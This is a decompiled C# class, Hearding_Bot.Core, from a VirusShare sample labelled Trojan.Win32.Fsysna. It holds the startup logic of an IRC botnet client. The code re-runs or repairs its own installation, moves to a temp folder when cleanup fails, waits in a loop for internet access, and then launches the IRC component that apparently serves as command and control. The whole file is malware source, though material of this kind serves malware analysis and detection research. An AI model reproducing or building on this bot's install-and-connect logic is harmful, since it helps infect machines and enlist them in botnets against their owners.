// Decompiled with JetBrains decompiler
// Type: Hearding_Bot.Core
// Assembly: Hearding Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 931E7B23-EA6E-4139-8BD0-1A4E0BF9E258
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Fsysna.dljm-a7abcca3397d1344b43d53c1427609ca1808f1991c5d2b158fd67c1ea3e6f19a.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Hearding_Bot
{
  internal class Core
  {
    public Core()
    {
      this.fixBrokenInstall();
      Core.checknow();
      while (!this.checkConnection())
        Thread.Sleep(300000);
      new Thread((ThreadStart) (() => Irc.Initialize())).Start();
    }

    public static bool check
    {
      get => !Install.isInstalled;
      set
      {
      }
    }

    private static void checknow()
    {
      if (!Core.check)
        return;
      Config.ircNick = Config.newNick;
      Install.install();
    }

    private bool checkConnection()
    {
      try
      {
        Dns.GetHostEntry("www.google.com");
        return true;
      }
      catch
      {
        return false;
      }
    }

    private void fixBrokenInstall()
    {
      if (!(Process.GetCurrentProcess().MainModule.FileName.ToLower() != (Config.installPath + Config.installFile).ToLower()))
        return;
      try
      {
        if (!System.IO.File.Exists(Config.installPath + Config.installFile))
          return;
        System.IO.File.Delete(Config.installPath + Config.installFile);
      }
      catch (Exception ex1)
      {
        Directory.CreateDirectory(Path.GetTempPath() + Config.startupName + "info\\");
        Config.installPath = Path.GetTempPath() + Config.startupName + "info\\";
        if (!System.IO.File.Exists(Config.installPath + Config.installFile))
          return;
        try
        {
          System.IO.File.Delete(Config.installPath + Config.installFile);
        }
        catch (Exception ex2)
        {
        }
      }
    }
  }
}
